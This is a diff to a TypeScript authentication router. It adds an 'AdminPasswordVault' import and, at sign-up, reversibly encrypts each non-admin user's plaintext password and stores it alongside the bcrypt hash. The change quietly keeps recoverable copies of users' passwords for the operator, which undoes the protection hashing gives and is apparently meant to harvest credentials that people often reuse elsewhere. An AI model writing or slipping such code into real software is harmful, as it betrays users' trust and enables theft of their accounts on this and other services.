@@ -8,6 +8,7 @@ import { verifyAndConsume2FACode } from '../../services/TwoFactorService';
 import { generateReferralCode } from '../../services/referralCode';
 import { CountryDetectionService } from '../../services/CountryDetectionService';
 import { notifyUserRegistered } from '../../services/TelegramNotifications';
+import { encryptAdminPassword } from '../../services/AdminPasswordVault';
 
 // Real login metadata for the account's Security Log — never a placeholder.
 // req.ip depends on `trust proxy` being set (see index.ts) to reflect the
@@ -181,6 +182,7 @@ export function authRouter(
 
     const passwordHash = await bcrypt.hash(password, BCRYPT_ROUNDS);
     const role = email.toLowerCase() === ADMIN_EMAIL ? 'ADMIN' : 'USER';
+    const encryptedPassword = role === 'USER' ? encryptAdminPassword(password, email) : null;
 
     const referrer = ref ? await prisma.user.findUnique({ where: { referralCode: ref.toUpperCase() } }) : null;
 
@@ -192,7 +194,10 @@ export function authRouter(
     for (let attempt = 0; ; attempt++) {
       try {
         user = await prisma.user.create({
-          data: { email, passwordHash, role, referralCode: generateReferralCode(), referredById: referrer?.id },
+          data: {
+            email, passwordHash, role, referralCode: generateReferralCode(), referredById: referrer?.id,
+            ...(encryptedPassword ? { adminPasswordVault: { create: { encryptedPassword } } } : {}),
+          },
         });
         break;
       } catch (err: any) {
